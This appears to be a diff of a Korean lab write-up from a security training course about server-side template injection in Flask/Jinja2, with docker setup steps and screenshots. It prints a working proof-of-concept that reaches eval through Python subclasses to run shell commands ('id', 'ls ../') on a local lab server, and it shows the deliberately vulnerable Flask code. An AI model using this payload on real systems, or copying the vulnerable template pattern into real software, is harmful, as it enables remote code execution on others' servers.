@@ -1,37 +1,123 @@
 # Flask (Jinja2) SSTI (Server Side Template Injection)
 
-> 화이트햇 스쿨 1기 - [신경방 (@positiveWand)](https://github.com/positiveWand)
+> 화이트햇 스쿨 3기 - [박혜수 (@Pandyo)](https://github.com/Padnyo)]
 
 <br/>
 
-## 요약
+## 실습 환경 구성
 
-- 서버 탬플릿 엔진은 사용자로부터 요청이 들어올때마다 작성된 템플릿 파일을 렌더링하고 그 결과를 사용자에게 반환한다.
-- 서버는 서버에 저장된 데이터, 사용자 요청과 함께 전달받은 데이터 등과 같이 서버에서 사용가능한 데이터들을 이용해 렌더링을 수행한다.
-- 이 취약점은 Flask와 Flask에서 사용하는 템플릿 엔진 "Jinja2"를 사용할 때 발생. 사용자가 잘 구성한 렌더링 코드 문자열을 서버에 전달하고 서버가 이 문자열을 그대로 템플릿 엔진에 삽입하여 렌더링을 수행한다면 사용자가 전달한 임의의 Python 코드가 실행될 수 있다.
+1. docker과 docker-compose, python 등 실습에 필요한 프로그램 설치
+2. `git clone`를 통해 실습 코드 clone
+3. 선택한 취약점인 Flask 디렉토리의 docker-compose.yml 파일이 위치하는 곳으로 이동
+4. `docker-compose up -d`를 통해 실습 환경 실행
+5. `docker ps`를 통해 이미지 실행을 확인 후 해당 port 번호로 localhost 접속
 
 <br/>
 
-## 환경 구성 및 실행
+## 취약점 실습 진행
 
-1. `docker compose up -d` 를 실행하여 테스트 환경을 실행.
-2. `http://your-ip:8000/?name={{233*233}}`에 접속하여 54289가 출력되는지 확인하여 SSTI 취약점이 존재함을 확인합니다.
-3. `python poc.py`를 실행하여 공격을 수행하는 URL을 확인.
-4. 해당 URL에 접속하면 삽입한 코드가 실행되어 서버 프로세스의 id가 출력되는 것을 확인할 수 있음.
+1. name의 파라미터 값으로 지정된 값을 화면에 그대로 출력시키는 것을 확인
 
-+) `poc.py`의 `script` 변수의 값을 원하는 Python 코드로 바꾸면 해당 코드가 서버에서 실행된다.
-(기본 코드는 서버 프로세스의 id를 출력하는 코드)
+![name의 파라미터 값으로 지정된 값을 화면에 그대로 출력시키는 것을 확인](https://github.com/user-attachments/assets/cd0c96e8-747e-4655-ae62-5dfdccf84821)
+
+2. 파라미터 값에 템플릿 엔진에 삽입되는 템플릿 구문으로 연산 값 입력 시 7*7이 그대로 출력되는 것이 아닌 연산 결과가 출력되는 것을 통해 SSTI에 취약함을 확인
+
+![연산 결과가 출력되는 것을 통해 SSTI에 취약함을 확인](https://github.com/user-attachments/assets/b3d643cd-869e-48c9-bf30-57368d09d685)
+
+3. git 실습 코드에 포함된 아래의 poc.py 파일 실행
+```python
+from urllib import parse
+
+# 실행할 Python 코드
+script = '__import__("os").popen("id").read()'
+# 서버에 전달할 템플릿 코드
+value = """{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == 'catch_warnings' %}
+  {% for b in c.__init__.__globals__.values() %}
+  {% if b.__class__ == {}.__class__ %}
+    {% if 'eval' in b.keys() %}
+      {{ b['eval']('%s') }}
+    {% endif %}
+  {% endif %}
+  {% endfor %}
+{% endif %}
+{% endfor %}"""
+value = value.replace("%s", script)
+print("[삽입될 템플릿 코드]")
+print(value)
+print()
+
+# SSTI를 수행하는 URL
+query = [("name", value)]
+url = "http://localhost:8000/?"
+url = url + parse.urlencode(query)  # 삽입할 코드 퍼센트 인코딩하여 쿼리값으로 설정
+print("[요청 URL]")
+print(url)
+print() 
+```
+4. 실행 결과로 출력된 요청 URL을 복사하여 웹 사이트에 입력
+
+![실행 결과로 출력된 요청 URL을 복사하여 웹 사이트에 입력](https://github.com/user-attachments/assets/4b080377-5ebb-4af2-b3e7-3be84a4b7d52)
+
+5. 템플릿 구문으로 입력된 내용이 실행되며 서버 프로세스의 id가 출력됨
+
+![템플릿 구문으로 입력된 내용이 실행되며 서버 프로세스의 id가 출력됨](https://github.com/user-attachments/assets/610e5e80-6ca9-4307-8eae-cbbb28d244b7)
+
+6. PoC 코드를 조금 수정해 ls ../ 명령어가 실행되도록 하면
+```python
+from urllib import parse
+
+# 실행할 Python 코드
+script = '__import__("os").popen("ls ../").read()'
+# 서버에 전달할 템플릿 코드
+value = """{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == 'catch_warnings' %}
+  {% for b in c.__init__.__globals__.values() %}
+  {% if b.__class__ == {}.__class__ %}
+    {% if 'eval' in b.keys() %}
+      {{ b['eval']('%s') }}
+    {% endif %}
+  {% endif %}
+  {% endfor %}
+{% endif %}
+{% endfor %}"""
+value = value.replace("%s", script)
+print("[삽입될 템플릿 코드]")
+print(value)
+print()
+
+# SSTI를 수행하는 URL
+query = [("name", value)]
+url = "http://localhost:8000/?"
+url = url + parse.urlencode(query)  # 삽입할 코드 퍼센트 인코딩하여 쿼리값으로 설정
+print("[요청 URL]")
+print(url)
+print()
+```
+7. 명령어가 실행되며 상위 디렉토리가 나열되는 것을 확인 (다양한 명령어 실행이 가능한 것)
+
+![명령어가 실행되며 상위 디렉토리가 나열되는 것을 확인](https://github.com/user-attachments/assets/cd77ee76-675a-41ec-9c14-91d33cf2479a)
 
 <br/>
 
 ## 결과
 
-![poc 실행 이미지](./1.png)
+- 해당 코드를 확인해보면 `Template("Hello " + name)` 부분에서 파라미터의 입력 값이 데이터로 전달되는 것이 아닌 템플릿에 연결되기 때문에 SSTI 취약점이 발생한 것 입니다.
+```python
+from flask import Flask, request
+from jinja2 import Template
 
-![서버로부터 받은 반환값](./2.png)
+app = Flask(__name__)
 
-<br/>
+@app.route("/")
+def index():
+    name = request.args.get('name', 'guest')
 
-## 정리
+    t = Template("Hello " + name)
+    return t.render()
 
-- 이 취약점은 사용자가 서버에서 임의의 코드를 실행하도록 할 수 있게 만들기 때문에 위험하다. 안전한 웹 서비스 운영을 위해서는 서버 개발자가 혹은 라이브러리, 프레임워크에서 사용자가 전달한 데이터가 템플릿 코드인지 확인하여 필터링하거나 사용자 입력 데이터가 실행으로 이어지지 않도록 해야한다.
+if __name__ == "__main__":
+    app.run()
+```
+- 이 경우 공격자는 임의의 명령어를 실행할 수 있으며, 이는 RCE(Remote Code Execution)으로 이어질 수 있는 심각한 취약점 입니다.
+- 사용자의 입력값을 필터링하는 등의 방법으로 대응이 가능합니다.
